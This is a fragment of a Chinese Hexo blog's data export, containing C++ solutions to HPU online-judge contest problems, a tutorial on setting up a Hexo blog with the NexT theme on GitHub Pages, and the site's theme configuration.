title=\"G.Mo的数学\"></a>G.Mo的数学</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/G/\">https://hpuoj.com/contest/16/problem/G/</a><br>思路: 分解质因数,即$M$的因子的倍数都不和$M$互质,其余的都和$M$互质,此为暴力做法.正解为容斥原理,暂无.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">#define MOD 1000000007</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">bool zhi[1000020];</span><br><span class=\"line\">int N,M;</span><br><span class=\"line\">void gcd(int n)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tfor(int i&#x3D;2;i*i&lt;&#x3D;n;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif(n%i&#x3D;&#x3D;0)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tfor(int j&#x3D;1;j*i&lt;&#x3D;N;j++)</span><br><span class=\"line\">\t\t\t\tzhi[i*j]&#x3D;1;</span><br><span class=\"line\">\t\t\tfor(int j&#x3D;1;j*(n&#x2F;i)&lt;&#x3D;N;j++)</span><br><span class=\"line\">\t\t\t\tzhi[(n&#x2F;i)*j]&#x3D;1;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfor(int j&#x3D;1;j*n&lt;&#x3D;N;j++)</span><br><span class=\"line\">\t\tzhi[j*n]&#x3D;1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\twhile(cin&gt;&gt;N&gt;&gt;M)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tll ans&#x3D;1;</span><br><span class=\"line\">\t\tmemset(zhi,0,sizeof(zhi));</span><br><span class=\"line\">\t\tgcd(M);</span><br><span class=\"line\">\t\tfor(int i&#x3D;2;i&lt;&#x3D;N;i++)</span><br><span class=\"line\">\t\t\tif(!zhi[i])ans&#x3D;ans*i%MOD;</span><br><span class=\"line\">\t\tcout&lt;&lt;ans&lt;&lt;endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"H-Mo的面积\"><a href=\"#H-Mo的面积\" class=\"headerlink\" title=\"H.Mo的面积\"></a>H.Mo的面积</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/H/\">https://hpuoj.com/contest/16/problem/H/</a><br>思路: 两个矩形右边线中$x$值最小的减去两个矩形左边线中$x$值最大的即为重合矩形在$x$轴方向的长度;两个矩形上边线中$y$值最小的减去两个矩形下边线中$y$值最大的即为重合矩形在$y$轴方向的长度.如果其中一个值小于或等于0,则重合面积为0,否则,即为其乘积.求两矩形总面积减去重合部分面积即为答案.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a[2][2],b[2][2],x,y;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;2;i++)</span><br><span class=\"line\">\t\tfor(int j&#x3D;0;j&lt;2;j++)</span><br><span class=\"line\">\t\t\tcin&gt;&gt;a[i][j];</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;2;i++)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t\tfor(int j&#x3D;0;j&lt;2;j++)</span><br><span class=\"line\">\t\t\tcin&gt;&gt;b[i][j];</span><br><span class=\"line\">\tx&#x3D;min(a[1][0],b[1][0])-max(a[0][0],b[0][0]);</span><br><span class=\"line\">\ty&#x3D;min(a[1][1],b[1][1])-max(a[0][1],b[0][1]);</span><br><span class=\"line\">\tint s&#x3D;(a[1][1]-a[0][1])*(a[1][0]-a[0][0])+(b[1][1]-b[0][1])*(b[1][0]-b[0][0]);</span><br><span class=\"line\">\tif(x*y&gt;0)s-&#x3D;x*y;</span><br><span class=\"line\">\tcout&lt;&lt;s&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"I-安全距离\"><a href=\"#I-安全距离\" class=\"headerlink\" title=\"I.安全距离\"></a>I.安全距离</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/I/\">https://hpuoj.com/contest/16/problem/I/</a><br>思路: 思路暂无<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">代码暂无</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"J-简单递归\"><a href=\"#J-简单递归\" class=\"headerlink\" title=\"J.简单递归\"></a>J.简单递归</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/J/\">https://hpuoj.com/contest/16/problem/J/</a><br>思路: 讲题目代码递归转化为非递归即可.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">const int MOD &#x3D; (int)1e9 + 7;</span><br><span class=\"line\">int a[1000020];</span><br><span class=\"line\">void init()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\ta[1]&#x3D;a[2]&#x3D;1;</span><br><span class=\"line\">\tfor(int i&#x3D;3;i&lt;&#x3D;1000000;i++)</span><br><span class=\"line\">\t\ta[i]&#x3D;((a[i-1]&lt;&lt;1)%MOD+(a[i-2]&gt;&gt;1)%MOD)%MOD;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tinit();</span><br><span class=\"line\">\tint T,N;</span><br><span class=\"line\">\tcin&gt;&gt;T;</span><br><span class=\"line\">\twhile(T--)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcin&gt;&gt;N;</span><br><span class=\"line\">\t\tcout&lt;&lt;a[N]&lt;&lt;endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"K-高度期望\"><a href=\"#K-高度期望\" class=\"headerlink\" title=\"K.高度期望\"></a>K.高度期望</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/K/\">https://hpuoj.com/contest/16/problem/K/</a><br>思路: 贪心求解,先对树高进行排序,再从低到高遍历即可.<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint N,M,a[100020];</span><br><span class=\"line\">\tll ans&#x3D;0,res&#x3D;0;</span><br><span class=\"line\">\tcin&gt;&gt;N&gt;&gt;M;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;N;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcin&gt;&gt;a[i];</span><br><span class=\"line\">\t\tans+&#x3D;a[i];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsort(a,a+N);</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;N;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif(ans&gt;&#x3D;M*N)break;</span><br><span class=\"line\">\t\tans+&#x3D;1000-a[i];</span><br><span class=\"line\">\t\tres++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tcout&lt;&lt;res&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"L-最优规划\"><a href=\"#L-最优规划\" class=\"headerlink\" title=\"L.最优规划\"></a>L.最优规划</h2><p>题目链接: <a href=\"https://hpuoj.com/contest/16/problem/L/\">https://hpuoj.com/contest/16/problem/L/</a><br>思路: 思路暂无<br>代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">代码暂无</span><br></pre></td></tr></table></figure></p>"},{"title":"Hexo+NexT搭建博客","date":"2020-04-08T07:35:04.000Z","abbrlink":"277d2a74","_content":"### 准备工作\n\n#### GitHub\n注册一个 GitHub 账号，创建一个新的仓库，仓库名称严格命名为`todest.github.io`，`todest`为用户名，修改成你自己的。\n#### Git\n从此处 [Git官网](https://git-scm.com/) 下载并安装，右键打开`Git Bash`。\n<!--more-->\n##### 配置SSH\n```bash\nssh-keygen -t rsa -C \"邮件地址\"\t\t# 连续回车\n```\n将`\"C:\\Users\\你的用户名\\.ssh\\id_rsa.pub\"`的内容复制下来，打开`GitHub设置->SSH and GPG keys->New SSH key`，粘贴到此处确定。\n```bash\nssh -T git@github.com\n# 测试SSH是否配置好\n# 看到You've successfully authenticated, but GitHub does not provide shell access.\n# 则说明配置好了，否则无法使用hexo d\n```\n#### Node.js\n从 [Node.js官网](https://nodejs.org) 下载安装。\n\n#### 安装Hexo\n```bash\nnpm install hexo-cli -g\n```\n`install`可简写为 `i` 。\n#### 初始化Hexo\n```bash\nhexo init Blog\t\t\t\t\t# Blog可以修改成其他的名字\ncd Blog\t\t\t\t\t\t# 进入Blog文件夹\n```\n#### 安装Hexo扩展\n```bash\nnpm install hexo-deployer-git --save\nnpm install\n```\n### 部署\n\n#### 本地调试\n以下`g`是`generate`的缩写，`s`是`start`的缩写，`d`是`deploy`的缩写。\n```bash\nhexo clean\nhexo g\t\t\t\t\t\t# 生成  此条和后一条可简写为 hexo s -g\nhexo s\t\t\t\t\t\t# 预览\n```\n`hexo s`是开启本地预览服务，打开浏览器访问 <http://localhost:4000> 即可看到内容。\n\n#### 上传到GitHub Pages\n上传之前，打开站点配置文件`_config.yml`，位于站点根目录下，修改最后一部分为如下部分。\n```yaml\ndeploy:\n  type: git\n  repository: git@github.com:todest/todest.github.io.git    # 修改为你的GitHub用户名\n  branch: master\n```\n上传到`GitHub Pages`。\n```bash\nhexo clean\nhexo g\t\t\t\t\t\t# 此条和后一条可简写为 hexo d -g\nhexo d\n```\n\n#### 修改主题\n主题位置`themes`目录下，默认为`landscape`主题。可从官网 <https://hexo.io/themes/> 下载，推荐`NexT`主题，以下为安装方法。\n安装过程就一行代码，站点根目录下运行。\n```bash\ngit clone https://github.com/theme-next/hexo-theme-next themes/next\n```\n打开站点配置文件`_config.yml`，找到`theme： landscape`，修改为`next`就可以了。","source":"_posts/Hexo.md","raw":"---\ntitle: Hexo+NexT搭建博客\ndate: 2020-04-08 15:35:04\ncategories:\n  - Web\n  - 博客\ntags:\n  - Hexo\n  - NexT\nabbrlink: 277d2a74\n---\n### 准备工作\n\n#### GitHub\n注册一个 GitHub 账号，创建一个新的仓库，仓库名称严格命名为`todest.github.io`，`todest`为用户名，修改成你自己的。\n#### Git\n从此处 [Git官网](https://git-scm.com/) 下载并安装，右键打开`Git Bash`。\n<!--more-->\n##### 配置SSH\n```bash\nssh-keygen -t rsa -C \"邮件地址\"\t\t# 连续回车\n```\n将`\"C:\\Users\\你的用户名\\.ssh\\id_rsa.pub\"`的内容复制下来，打开`GitHub设置->SSH and GPG keys->New SSH key`，粘贴到此处确定。\n```bash\nssh -T git@github.com\n# 测试SSH是否配置好\n# 看到You've successfully authenticated, but GitHub does not provide shell access.\n# 则说明配置好了，否则无法使用hexo d\n```\n#### Node.js\n从 [Node.js官网](https://nodejs.org) 下载安装。\n\n#### 安装Hexo\n```bash\nnpm install hexo-cli -g\n```\n`install`可简写为 `i` 。\n#### 初始化Hexo\n```bash\nhexo init Blog\t\t\t\t\t# Blog可以修改成其他的名字\ncd Blog\t\t\t\t\t\t# 进入Blog文件夹\n```\n#### 安装Hexo扩展\n```bash\nnpm install hexo-deployer-git --save\nnpm install\n```\n### 部署\n\n#### 本地调试\n以下`g`是`generate`的缩写，`s`是`start`的缩写，`d`是`deploy`的缩写。\n```bash\nhexo clean\nhexo g\t\t\t\t\t\t# 生成  此条和后一条可简写为 hexo s -g\nhexo s\t\t\t\t\t\t# 预览\n```\n`hexo s`是开启本地预览服务，打开浏览器访问 <http://localhost:4000> 即可看到内容。\n\n#### 上传到GitHub Pages\n上传之前，打开站点配置文件`_config.yml`，位于站点根目录下，修改最后一部分为如下部分。\n```yaml\ndeploy:\n  type: git\n  repository: git@github.com:todest/todest.github.io.git    # 修改为你的GitHub用户名\n  branch: master\n```\n上传到`GitHub Pages`。\n```bash\nhexo clean\nhexo g\t\t\t\t\t\t# 此条和后一条可简写为 hexo d -g\nhexo d\n```\n\n#### 修改主题\n主题位置`themes`目录下，默认为`landscape`主题。可从官网 <https://hexo.io/themes/> 下载，推荐`NexT`主题，以下为安装方法。\n安装过程就一行代码，站点根目录下运行。\n```bash\ngit clone https://github.com/theme-next/hexo-theme-next themes/next\n```\n打开站点配置文件`_config.yml`，找到`theme： landscape`，修改为`next`就可以了。","slug":"Hexo","published":1,"updated":"2020-05-11T09:31:24.400Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkaw0017qse56p69fxhv","content":"<h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><h4 id=\"GitHub\"><a href=\"#GitHub\" class=\"headerlink\" title=\"GitHub\"></a>GitHub</h4><p>注册一个 GitHub 账号，创建一个新的仓库，仓库名称严格命名为<code>todest.github.io</code>，<code>todest</code>为用户名，修改成你自己的。</p>\n<h4 id=\"Git\"><a href=\"#Git\" class=\"headerlink\" title=\"Git\"></a>Git</h4><p>从此处 <a href=\"https://git-scm.com/\">Git官网</a> 下载并安装，右键打开<code>Git Bash</code>。<br><a id=\"more\"></a></p>\n<h5 id=\"配置SSH\"><a href=\"#配置SSH\" class=\"headerlink\" title=\"配置SSH\"></a>配置SSH</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa -C <span class=\"string\">&quot;邮件地址&quot;</span>\t\t<span class=\"comment\"># 连续回车</span></span><br></pre></td></tr></table></figure>\n<p>将<code>&quot;C:\\Users\\你的用户名\\.ssh\\id_rsa.pub&quot;</code>的内容复制下来，打开<code>GitHub设置-&gt;SSH and GPG keys-&gt;New SSH key</code>，粘贴到此处确定。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -T git@github.com</span><br><span class=\"line\"><span class=\"comment\"># 测试SSH是否配置好</span></span><br><span class=\"line\"><span class=\"comment\"># 看到You&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br><span class=\"line\"><span class=\"comment\"># 则说明配置好了，否则无法使用hexo d</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"Node-js\"><a href=\"#Node-js\" class=\"headerlink\" title=\"Node.js\"></a>Node.js</h4><p>从 <a href=\"https://nodejs.org\">Node.js官网</a> 下载安装。</p>\n<h4 id=\"安装Hexo\"><a href=\"#安装Hexo\" class=\"headerlink\" title=\"安装Hexo\"></a>安装Hexo</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>\n<p><code>install</code>可简写为 <code>i</code> 。</p>\n<h4 id=\"初始化Hexo\"><a href=\"#初始化Hexo\" class=\"headerlink\" title=\"初始化Hexo\"></a>初始化Hexo</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo init Blog\t\t\t\t\t<span class=\"comment\"># Blog可以修改成其他的名字</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> Blog\t\t\t\t\t\t<span class=\"comment\"># 进入Blog文件夹</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"安装Hexo扩展\"><a href=\"#安装Hexo扩展\" class=\"headerlink\" title=\"安装Hexo扩展\"></a>安装Hexo扩展</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-deployer-git --save</span><br><span class=\"line\">npm install</span><br></pre></td></tr></table></figure>\n<h3 id=\"部署\"><a href=\"#部署\" class=\"headerlink\" title=\"部署\"></a>部署</h3><h4 id=\"本地调试\"><a href=\"#本地调试\" class=\"headerlink\" title=\"本地调试\"></a>本地调试</h4><p>以下<code>g</code>是<code>generate</code>的缩写，<code>s</code>是<code>start</code>的缩写，<code>d</code>是<code>deploy</code>的缩写。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g\t\t\t\t\t\t<span class=\"comment\"># 生成  此条和后一条可简写为 hexo s -g</span></span><br><span class=\"line\">hexo s\t\t\t\t\t\t<span class=\"comment\"># 预览</span></span><br></pre></td></tr></table></figure><br><code>hexo s</code>是开启本地预览服务，打开浏览器访问 <a href=\"http://localhost:4000\">http://localhost:4000</a> 即可看到内容。</p>\n<h4 id=\"上传到GitHub-Pages\"><a href=\"#上传到GitHub-Pages\" class=\"headerlink\" title=\"上传到GitHub Pages\"></a>上传到GitHub Pages</h4><p>上传之前，打开站点配置文件<code>_config.yml</code>，位于站点根目录下，修改最后一部分为如下部分。<br><figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">deploy:</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">git</span></span><br><span class=\"line\">  <span class=\"attr\">repository:</span> <span class=\"string\">git@github.com:todest/todest.github.io.git</span>    <span class=\"comment\"># 修改为你的GitHub用户名</span></span><br><span class=\"line\">  <span class=\"attr\">branch:</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure><br>上传到<code>GitHub Pages</code>。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g\t\t\t\t\t\t<span class=\"comment\"># 此条和后一条可简写为 hexo d -g</span></span><br><span class=\"line\">hexo d</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"修改主题\"><a href=\"#修改主题\" class=\"headerlink\" title=\"修改主题\"></a>修改主题</h4><p>主题位置<code>themes</code>目录下，默认为<code>landscape</code>主题。可从官网 <a href=\"https://hexo.io/themes/\">https://hexo.io/themes/</a> 下载，推荐<code>NexT</code>主题，以下为安装方法。<br>安装过程就一行代码，站点根目录下运行。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><br>打开站点配置文件<code>_config.yml</code>，找到<code>theme： landscape</code>，修改为<code>next</code>就可以了。</p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} 